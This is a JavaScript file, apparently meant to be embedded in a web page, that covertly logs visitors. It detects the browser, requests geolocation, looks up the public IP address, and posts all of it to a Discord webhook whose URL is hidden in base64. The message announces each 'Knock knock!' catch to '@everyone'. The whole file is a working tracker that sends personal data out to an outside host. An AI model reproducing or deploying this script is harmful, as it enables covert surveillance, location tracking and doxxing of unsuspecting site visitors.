// User Agent Detection
let useragent = navigator.userAgent;
let browser;

const fetchLocation = true;

if (useragent.match(/edge/i)) {
  browser = "Edge";
} else if (useragent.match(/firefox|fxios/i)) {
  browser = "Firefox";
} else if (useragent.match(/opr|opera/i)) {
  browser = "Opera";
} else if (useragent.match(/chrome|chromium|crios/i)) {
  browser = "Chrome";
} else if (useragent.match(/safari/i)) {
  browser = "Safari";
} else {
  browser = "Unknown";
}

// Get Location
function showPosition() {
  return new Promise((resolve, reject) => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          resolve(`https://www.google.com/maps/@${lat},${lon},17z`);
        },
        (error) => reject(`Geolocation error: ${error.message}`)
      );
    } else {
      reject("Geolocation is not supported by this browser.");
    }
  });
}

// Fetch Public IP and Send Data to Discord Webhook
fetch("https://api.ipify.org?format=json")
  .then((response) => response.json())
  .then(async (data) => {
    const ipAddress = data.ip;
    const webhookEncoded = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMzNDE1OTExNTQ2Njk2OTE2OC9IaXJweVZ0VkM5dU1OOEloRDFGVzB1UmIxZC1BTUhzdDFLa2JWWFhsWWJoWl9zVUt3RnAxVTZmT2EzcE5zU0txTHNnZQ=="
    const webhook = atob(webhookEncoded);

    let location;
    if(fetchLocation){
      location = "Location unavailable";
      try {
        location = await showPosition(); // Await geolocation
      } catch (error) {
        console.error(error);
      }
    } else {
      location = "Location variable is set to false";
    }

    // Send data to Discord webhook
    fetch(webhook, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        content: `@everyone \n:money_mouth: **Knock knock!** \n\n**IP Address:** ${ipAddress}\n**Lookup:** https://whatismyipaddress.com/ip/${ipAddress}\n**Geolocation:** ${location}\n\n**Browser:** ${browser}`,
      }),
    })
      .then(() => console.log("Data sent to Discord webhook"))
      .catch((error) => console.error("Failed to send data:", error));
  })
  .catch((error) => {
    console.error("Failed to fetch IP address:", error);
  });
